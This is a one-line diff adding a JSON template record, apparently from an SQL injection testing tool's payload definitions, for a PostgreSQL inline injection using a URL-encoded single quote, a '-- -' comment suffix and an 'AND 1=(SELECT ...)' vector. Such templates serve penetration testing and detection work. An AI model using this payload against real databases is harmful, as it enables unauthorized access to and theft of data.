@@ -1,0 +1,1 @@
+{"dbms": "pgsql", "technique": "inline", "boundary": {"prefix": "%27", "suffix": "-- -", "type": "single-enc"}, "vector": "{B} AND 1=(SELECT ({Q}))", "comment": "pgsql inline: url-enc single"}
